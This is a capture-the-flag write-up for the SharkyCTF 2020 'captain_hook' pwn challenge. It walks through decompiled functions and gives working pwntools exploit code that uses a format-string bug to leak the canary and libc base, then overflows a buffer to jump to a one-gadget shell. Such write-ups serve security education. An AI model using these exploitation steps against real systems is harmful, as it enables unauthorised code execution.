
## captain_hook
### Description

> Find a way to pop a shell.
>
> Creator: Hackhim

### Attachment

[captain_hook](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/captain_hook/captain_hook), [libc](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/captain_hook/libc-2.27.so)

### Analysis

#### Overview

```c
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```shell
% ./captain_hook 

==Commands========
 1 -> List all characters
 2 -> Lock up a new character
 3 -> Read character infos
 4 -> Edit character infos
 5 -> Free a character
 6 -> Quit
==================

peterpan@pwnuser:~$ 
```

#### lock_up_character

We can input `name`, `age` and `date` in sequence, and the data was stored in follow format:

```c
// 0-13   name
// 32-35  age
// 36-47  date
```

```c
unsigned __int64 lock_up_character(){
  _BYTE v1[12]; // [rsp+Ch] [rbp-14h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf(" [ Character index ]: ");
  *v1 = read_user_int();
  if ( *v1 < 0 || *v1 > 3 || jail[*v1] ){
    puts("  [!] Invalid index.");
  }
  else {
    *&v1[4] = malloc(0x44uLL);
    if ( !*&v1[4] )
      exit(-1);
    puts(" [ Character ]");
    printf("  Name: ");
    read_user_str(*&v1[4], 31LL);
    printf("  Age: ", 31LL);
    *(*&v1[4] + 32LL) = read_user_int();
    printf("  Date (mm/dd/yyyy): ");
    read_user_str(*&v1[4] + 36LL, 11LL);
    jail[*v1] = *&v1[4];
  }
  return __readfsqword(0x28u) ^ v2;
}
```

> read 31 bytes to `name` and 11 bytes to `date`

#### edit_character

We can edit character which we have looked up, and name, age and date would be updated if the new value is different from the older.

```c
unsigned __int64 edit_character() {
  __int64 v1; // [rsp+0h] [rbp-40h]
  int v2; // [rsp+4h] [rbp-3Ch]
  char *s1; // [rsp+8h] [rbp-38h]
  char s2; // [rsp+10h] [rbp-30h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf(" [ Character index ]: ");
  LODWORD(v1) = read_user_int();
  if ( v1 >= 0 && v1 <= 3 && jail[v1] ) {
    s1 = jail[v1];
    puts(" [ Character ]");
    printf("  Name: ", v1);
    read_user_str(&s2, 127LL);     // bof here
    if ( strcmp(s1, &s2) )
      strncpy(s1, &s2, 0x20uLL);
    printf("  Age: ", &s2);
    v2 = read_user_int();
    if ( *(s1 + 8) != v2 )
      *(s1 + 8) = v2;
    printf("  Date (mm/dd/yyyy): ");
    read(0, &s2, 0xAuLL);
    if ( strcmp(s1 + 36, &s2) )
      strncpy(s1 + 36, &s2, 0x20uLL);
  }
  else {
    puts("  [!] Invalid index.");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

> Notice: read 127 bytes to `name` that cause buffer overflow

Here is a bof, but we can't overwrite the return address directly, because it's protected by `canary` .

#### read_info

We can print `name`, `age` and `date` in this function. If the `date` is a valid format, `printf(src + 36)` which hold a format string vulnerability would be called!

```c
unsigned __int64 read_character_infos(){
  __int64 v1; // [rsp+0h] [rbp-40h]
  char *src; // [rsp+8h] [rbp-38h]
  char dest; // [rsp+10h] [rbp-30h]
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf(" [ Character index ]: ");
  LODWORD(v1) = read_user_int();
  if ( v1 >= 0 && v1 <= 3 && jail[v1] ) {
    src = jail[v1];
    strncpy(&dest, jail[v1], 0x20uLL);
    printf("Character name: %s\n", &dest, v1);
    printf("Age: %d\n", *(src + 8));
    strncpy(&dest, src + 36, 0x20uLL);
    printf("He's been locked up on ", src + 36);
    if ( check_date_format((src + 36)) )
      printf(src + 36);       // fmtstring vuln here
    else
      printf("an invalid date.");
    puts(".");
  }
  else {
    puts("  [!] Invalid index.");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

#### helper funtion

I define some helper function for exploiting:

```python
def add(index):
    sla('peterpan@pwnuser:~$ ','2')
    sla(' [ Character index ]: ',str(index))
    sla('  Name: ','TaQini')
    sla('  Age: ','18')
    sla('  Date (mm/dd/yyyy): ','02/02/2020')

def edit(index,fmt):
    sla('peterpan@pwnuser:~$ ','4')
    sla(' [ Character index ]: ',str(index))
    sla('  Name: ','TaQiniAAAA'+fmt)
    sla('  Age: ','20')
    sla('  Date (mm/dd/yyyy): ','02/04/2020')

def read_info(index):
    sla('peterpan@pwnuser:~$ ','3')
    sla(' [ Character index ]: ',str(index))
```

### Solution

As we know the struct of character is as follow, and we can call `edit_character` to edit the character more than 47 bytes

```c
// 0-13   name
// 32-35  age
// 36-47  date
```

When we edit the character, we can puts some format string in the behind of date for leaking info   

```python
add(0)
edit(0,'%17$p.%18$p.%19$p')
read_info(0)
ru('He\'s been locked up on 02/04/2020')
canary = eval(ru('.'))
text = eval(ru('.'))
libcbase = eval(ru('.'))-0x21b97
info_addr('canary',canary)
info_addr('text',text)
info_addr('libc',libcbase)
```

We can overwrite return address with one gadget after `canary` was leaked. 

```python
# debug('b *$rebase(0x1170)')
og = 0x4f322 + libcbase 
# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
edit(0,'A'*30+p64(canary)+p64(0)+p64(og)+p64(0)*8)
```

> restore canary then overwrite return address


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/SharkyCTF-2020/pwn/captain_hook) 


